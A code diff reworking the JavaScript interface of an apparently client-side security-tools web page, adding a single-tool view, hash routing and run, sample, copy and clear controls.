+          <div class="psv-back-bar">
+            <button type="button" class="psv-back-btn" onclick="window.PSVApp.backToCatalog()">← Back to All Security Tools (13)</button>
+          </div>
+
+          <!-- Centered Tool Header (Exact Match to Screenshot 4) -->
+          <div class="psv-tool-hero">
+            <div class="psv-tool-hero-icon">${esc(tool.badge)}</div>
+            <h1>${esc(tool.title)}</h1>
+            <p>${esc(tool.desc)}</p>
+            <div class="psv-hero-badges">
+              <span class="psv-pill-badge">🛡️ 100% Client-Side Execution</span>
+              <span class="psv-pill-badge">🔒 Zero Data Leaves Your Browser</span>
+            </div>
+          </div>
+
+          <!-- Centered Terminal Window -->
+          <div class="psv-terminal-box">
+            <div class="psv-window-bar">
+              <div class="psv-window-dots">
+                <span class="psv-dot"></span><span class="psv-dot"></span><span class="psv-dot"></span>
+                <span style="margin-left:0.5rem;">PSV // ${esc(tool.id.toUpperCase())}-WORKBENCH</span>
+              </div>
+              <span>CLIENT-SIDE</span>
+            </div>
+
+            <div class="psv-term-body">
+              <div class="psv-privacy-strip">
+                🔒 <strong>Privacy Guarantee:</strong> All parsing, decoding, and rule compilation runs locally in your browser memory. Nothing is sent to any server.
+              </div>
+
+              <div class="psv-field-label">
+                <span>INPUT TELEMETRY / PAYLOAD</span>
+                <span>LIVE INTERACTIVE MODE</span>
+              </div>
+              <textarea id="psv-tool-editor" class="psv-editor" spellcheck="false">${esc(currentInput)}</textarea>
+
+              <div class="psv-Action-bar">
+                <div class="psv-opt-group">
+                  ${(tool.options || []).map((opt, idx) => `
+                    <button type="button" class="psv-opt-pill ${selectedOptionIdx === idx ? "active" : ""}" onclick="window.PSVApp.setOption(${idx})">${esc(opt)}</button>
+                  `).join("")}
+                </div>
+
+                <div class="psv-btn-group">
+                  <button type="button" class="psv-btn-run" onclick="window.PSVApp.runTool()">⚡ ${esc(tool.actionLabel)}</button>
+                  <button type="button" class="psv-btn-util" onclick="window.PSVApp.loadSample()">Load Sample</button>
+                  <button type="button" class="psv-btn-util" onclick="window.PSVApp.copyOutput()">Copy Output</button>
+                  <button type="button" class="psv-btn-util" onclick="window.PSVApp.clearTool()">Clear</button>
+                </div>
+              </div>
+
+              <div class="psv-field-label">
+                <span>COMPUTED ANALYSIS OUTPUT</span>
+              </div>
+              <div id="psv-tool-result-box" class="psv-output-container">
+                ${computeDynamicOutput(tool, currentInput)}
+              </div>
+            </div>
+          </div>
+
+          <!-- Documentation & Best Practices Sections Below Tool (Screenshot 4 Layout) -->
+          <div class="psv-doc-section">
+            <h3>What this tool does</h3>
+            <p>${esc(tool.whatItDoes)}</p>
+          </div>
+
+          <div class="psv-doc-section">
+            <h3>Why it matters</h3>
+            <p>${esc(tool.whyItMatters)}</p>
+          </div>
+
+          <div class="psv-doc-section">
+            <h3>How it works</h3>
+            <p>${esc(tool.howItWorks)}</p>
+          </div>
+
+          <div class="psv-doc-section">
+            <h3>Best practices</h3>
+            <ul>
+              ${(tool.bestPractices || []).map(bp => `<li>${esc(bp)}</li>`).join("")}
+            </ul>
+          </div>
+
+          <div class="psv-doc-section">
+            <h3>Frequently Asked Questions</h3>
+            ${(tool.faqs || []).map(f => `
+              <details class="psv-faq-item">
+                <summary>${esc(f.q)}</summary>
+                <p>${esc(f.a)}</p>
+              </details>
+            `).join("")}
+          </div>
+
+          <div class="psv-doc-section">
+            <h3>Related Tools</h3>
+            <div class="psv-related-grid">
+              ${relatedTools.map(rt => `
+                <div class="psv-tool-card" onclick="window.PSVApp.openTool('${rt.id}')">
+                  <div>
+                    <div class="psv-card-head">
+                      <span class="psv-card-badge">${esc(rt.badge)}</span>
+                    </div>
+                    <h4 class="psv-card-title" style="font-size:0.92rem;">${esc(rt.title)}</h4>
+                    <p class="psv-card-desc" style="font-size:0.75rem;margin-bottom:0.5rem;">${esc(rt.desc)}</p>
+                  </div>
+                  <span class="psv-open-link" style="font-size:0.74rem;">Open Tool →</span>
+                </div>
+              `).join("")}
+            </div>
+          </div>
+        </div>
+      </div>
+    `;
+
+    const ed = document.getElementById("psv-tool-editor");
+    if (ed) {
+      ed.addEventListener("input", function (e) {
+        userInputs[tool.id] = e.target.value;
+        const out = document.getElementById("psv-tool-result-box");
+        if (out) out.innerHTML = computeDynamicOutput(tool, e.target.value);
+      });
+    }
+  }
+
+  function render() {
+    injectStyles();
+    const root = document.getElementById("psv-workbench-root") || document.querySelector(".md-content__inner");
+    if (!root) return;
+
+    if (currentView === "tool") {
+      renderSingleToolView(root);
+    } else {
+      renderCatalogView(root);
+    }
+  }
+
+  function syncHashRoute() {
+    const h = window.location.hash || "";
+    if (h.startsWith("#tool/")) {
+      const id = h.replace("#tool/", "").trim();
+      if (TOOLS.some(t => t.id === id)) {
+        activeToolId = id;
+        currentView = "tool";
+        selectedOptionIdx = 0;
+        render();
+        window.scrollTo({ top: 0, behavior: "smooth" });
+        return;
+      }
+    }
+    currentView = "catalog";
+    render();
+  }
+
+  window.PSVApp = {
+    setCat: function (catId) {
       activeCat = catId;
-      const firstInCat = TOOLS.find(t => catId === "all" || t.cat === catId);
-      if (firstInCat) activeToolId = firstInCat.id;
-      renderDashboard();
+      render();
     },
-    openTool: function (toolId, scroll) {
+    openTool: function (toolId) {
       activeToolId = toolId;
-      renderDashboard();
-      if (scroll) {
-        const anchor = document.getElementById("psv-workbench-anchor");
-        if (anchor) anchor.scrollIntoView({ behavior: "smooth", block: "start" });
-      }
+      selectedOptionIdx = 0;
+      currentView = "tool";
+      window.location.hash = "tool/" + toolId;
+      render();
+      window.scrollTo({ top: 0, behavior: "smooth" });
     },
-    setTab: function (tabName) {
-      activeTab = tabName;
-      renderDashboard();
+    backToCatalog: function () {
+      currentView = "catalog";
+      window.location.hash = "";
+      render();
+      window.scrollTo({ top: 0, behavior: "smooth" });
     },
-    runCurrent: function () {
+    setOption: function (idx) {
+      selectedOptionIdx = idx;
+      this.runTool();
+      render();
+    },
+    runTool: function () {
       const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
-      const liveIn = document.getElementById("psv-live-input");
-      const resBox = document.getElementById("psv-live-results");
-      if (liveIn && resBox) {
-        resBox.innerHTML = buildToolOutputHTML(tool, liveIn.value);
+      const ed = document.getElementById("psv-tool-editor");
+      const out = document.getElementById("psv-tool-result-box");
+      if (!ed || !out) return;
+      if (!ed.value.trim()) {
+        ed.value = tool.sample;
+        userInputs[tool.id] = tool.sample;
       }
+      out.innerHTML = computeDynamicOutput(tool, ed.value);
     },
     loadSample: function () {
       const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
-      const liveIn = document.getElementById("psv-live-input");
-      if (liveIn) {
-        liveIn.value = tool.sample;
-        this.runCurrent();
-      }
+      userInputs[tool.id] = tool.sample;
+      render();
     },
-    clearInput: function () {
-      const liveIn = document.getElementById("psv-live-input");
-      const resBox = document.getElementById("psv-live-results");
-      if (liveIn) liveIn.value = "";
-      if (resBox) resBox.innerHTML = `<div style="padding:1rem;color:#94a3b8;">Input cleared. Click <strong>⚡ Load Sample</strong> or paste telemetry on the left to analyze.</div>`;
+    clearTool: function () {
+      const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
+      userInputs[tool.id] = "";
+      const ed = document.getElementById("psv-tool-editor");
+      const out = document.getElementById("psv-tool-result-box");
+      if (ed) ed.value = "";
+      if (out) out.innerHTML = `<div style="color:#94a3b8;padding:0.5rem;">Workspace cleared. Click <strong>Load Sample</strong> or paste your own telemetry above.</div>`;
+    },
+    copyOutput: function () {
+      const out = document.getElementById("psv-tool-result-box");
+      if (out && navigator.clipboard) {
+        navigator.clipboard.writeText(out.innerText);
+      }
     }
   };
 
+  window.addEventListener("hashchange", syncHashRoute);
+
   if (typeof document$ !== "undefined") {
-    document$.subscribe(() => renderDashboard());
+    document$.subscribe(() => syncHashRoute());
   } else if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", renderDashboard);
+    document.addEventListener("DOMContentLoaded", syncHashRoute);
   } else {
-    renderDashboard();
+    syncHashRoute();
   }
 })();
